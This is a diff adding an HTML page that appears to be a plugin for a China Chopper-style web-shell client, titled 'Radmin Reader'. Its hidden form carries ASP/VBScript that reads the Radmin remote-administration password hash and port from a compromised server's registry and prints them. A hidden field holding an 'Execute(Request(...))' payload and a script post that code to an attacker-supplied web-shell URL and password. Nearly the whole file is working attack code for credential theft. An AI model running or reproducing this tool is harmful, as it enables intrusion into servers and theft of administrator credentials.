@@ -1,0 +1,86 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Radmin Reader ==> <A HREF="http://www.rootkit.net.cn" target=_blank>Bin</A> ==> <A HREF="mailto:master@rootkit.net.cn">:)</A><hr>
+</div>
+<form name="xform" method="post" target="_blank">
+<textarea name="code" cols="80" rows="20" style="display:none">
+'========================================Main======================================
+Set WSH= Server.CreateObject("WSCRIPT.SHELL")
+RadminPath="HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\"
+Parameter="Parameter"
+Port = "Port"
+ParameterArray=WSH.REGREAD(RadminPath & Parameter )
+Response.write "Radmin Parameter,Port Reader :)==>Bin<br><br>"
+Response.write Parameter&":"
+'=========== ReadPassWord =========
+If IsArray(ParameterArray) Then
+For i = 0 To UBound(ParameterArray)
+If  Len (hex(ParameterArray(i)))=1 Then 
+strObj = strObj & "0"&CStr(Hex(ParameterArray(i)))
+Else
+strObj = strObj & Hex(ParameterArray(i))
+End If 
+Next
+response.write strobj
+Else
+response.write "Error! Can't Read!"
+End If
+Response.write "<br><br>"
+'=========== ReadPort =========
+PortArray=WSH.REGREAD(RadminPath & Port )
+If IsArray(PortArray) Then 
+Response.write Port &":" 
+Response.write hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0))))
+Else 
+Response.write "Error! Can't Read!"
+End If
+'=======================================hex TO int===================================
+Function hextointer(strin) 
+Dim i, j, k, result 
+result = 0 
+For i = 1 To Len(strin) 
+If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
+j = 15 
+End If 
+If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
+j = 14 
+End If 
+If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
+j = 13 
+End If 
+If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
+j = 12 
+End If 
+If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
+j = 11 
+End If 
+If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
+j = 10 
+End If 
+If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
+j = CInt(Mid(strin, i, 1)) 
+End If 
+For k = 1 To Len(strin) - i 
+j = j * 16 
+Next 
+result = result + j 
+Next 
+hextointer = result 
+End Function
+'====================================== End ======================================
+</textarea>
+<PRE>
+&lt;%
+<script>
+document.write(document.xform.code.innerHTML);</script>
+%&gt;
+</PRE>
+<hr>
+<input type="hidden" name="china" value='Execute(&quot;Execute(Request(&quot;&quot;code&quot;&quot;))&quot;)'>
+</form>
+<script>
+function RUNonclick(){
+document.xform.china.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
